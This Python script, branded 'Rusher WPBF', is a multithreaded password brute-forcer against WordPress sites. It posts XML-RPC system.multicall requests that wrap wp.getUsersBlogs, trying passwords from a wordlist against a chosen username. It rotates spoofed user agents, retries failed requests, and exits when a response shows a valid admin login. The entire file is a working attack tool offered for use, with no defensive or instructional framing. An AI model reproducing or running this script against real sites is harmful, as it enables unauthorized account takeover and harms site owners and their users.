print("""
 /$$$$$$$          /$$      /$$ /$$$$$$$  /$$$$$$$  /$$$$$$$$
| $$__  $$        | $$  /$ | $$| $$__  $$| $$__  $$| $$_____/
| $$  \ $$        | $$ /$$$| $$| $$  \ $$| $$  \ $$| $$      
| $$$$$$$/ /$$$$$$| $$/$$ $$ $$| $$$$$$$/| $$$$$$$ | $$$$$   
| $$__  $$|______/| $$$$_  $$$$| $$____/ | $$__  $$| $$__/   
| $$  \ $$        | $$$/ \  $$$| $$      | $$  \ $$| $$      
| $$  | $$        | $$/   \  $$| $$      | $$$$$$$/| $$      
|__/  |__/        |__/     \__/|__/      |_______/ |__/      
                                                             
=============================================================
[*] Rusher WPBF | R&D ICWR - Afrizal F.A
=============================================================
""")

import os, random, requests
from argparse import ArgumentParser
from threading import Thread
from time import sleep as delay

class rusher_wpbf:

    def useragent(self):

        arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16", "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0", "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
        return arr[random.randint(0,len(arr)-1)]

    def req(self, user, passwd):

        try:

            xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
            x = requests.post(url=self.args.target, headers={ "User-Agent": self.useragent() }, data=xml, timeout=5)

            if "<name>isAdmin</name>" in x.text:

                print("[+] [Success] [{}] -> ( {} | {} )".format(self.args.target, user, passwd))
                os._exit(1)

            else:

                print("[-] [Failed] [{}] -> ( {} | {} )".format(self.args.target, user, passwd))

        except:

            print("[-] [Error] [{}] -> ( {} | {} )".format(self.args.target, user, passwd))
            self.req(user, passwd)

    def __init__(self):

        self.parser = ArgumentParser()
        self.parser.add_argument("-x", "--target", required=True)
        self.parser.add_argument("-u", "--user", required=True)
        self.parser.add_argument("-w", "--wordlist", required=True)
        self.args = self.parser.parse_args()

        if os.path.isfile(self.args.wordlist):

            for x in open(self.args.wordlist, errors="ignore").read().split("\n"):

                t = Thread(target=self.req, args=(self.args.user, x))
                t.daemon = True
                t.start()
                delay(0.1)

        else:

            print("[-] Not found ( {} )".format(self.args.wordlist))

if __name__ == "__main__":
    
    rusher_wpbf()
